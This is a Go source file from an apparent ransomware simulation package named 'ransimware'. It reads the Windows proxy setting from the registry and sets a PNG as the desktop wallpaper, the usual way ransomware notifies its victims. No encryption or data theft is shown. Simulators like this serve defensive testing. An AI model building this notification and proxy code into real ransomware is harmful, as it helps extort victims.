//+build windows

package ransimware

import (
	"net/http"
	"net/url"
	"os"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

func getSystemProxy() func(req *http.Request) (*url.URL, error) {
	var e error
	var k registry.Key
	var proxy *url.URL
	var v string

	// Open the "Internet Settings" registry key
	k, e = registry.OpenKey(
		registry.CURRENT_USER,
		strings.Join(
			[]string{
				"Software",
				"Microsoft",
				"Windows",
				"CurrentVersion",
				"Internet Settings",
			},
			"\\",
		),
		registry.QUERY_VALUE,
	)
	if e != nil {
		return http.ProxyFromEnvironment
	}
	defer k.Close()

	// Read the "ProxyServer" value
	v, _, e = k.GetStringValue("ProxyServer")
	if (e != nil) || (v == "") {
		return http.ProxyFromEnvironment
	}

	// Get the http= portion and fix it up
	v = strings.Split(v, ";")[0]
	v = strings.Replace(v, "=", "://", 1)

	// Parse url
	if proxy, e = url.Parse(v); e != nil {
		return http.ProxyFromEnvironment
	}

	return http.ProxyURL(proxy)
}

// WallpaperNotify is a NotifyFunc that sets the background wallpaper.
func WallpaperNotify(image string, png []byte) NotifyFunc {
	return func() error {
		var e error
		var f *os.File
		var spiSetdeskwallpaper uintptr = 0x0014
		var spifSendchange uintptr = 0x0002
		var spifUpdateinifile uintptr = 0x0001
		var user32 *windows.LazyDLL

		// Create image file
		if f, e = os.Create(image); e != nil {
			return e
		}

		// Write PNG to file
		f.Write(png)
		f.Close()

		// Change background with Windows API
		user32 = windows.NewLazySystemDLL("User32")
		user32.NewProc("SystemParametersInfoA").Call(
			spiSetdeskwallpaper,
			0,
			uintptr(unsafe.Pointer(&[]byte(image)[0])),
			spifSendchange|spifUpdateinifile,
		)

		// Remove image file
		os.Remove(image)

		return nil
	}
}
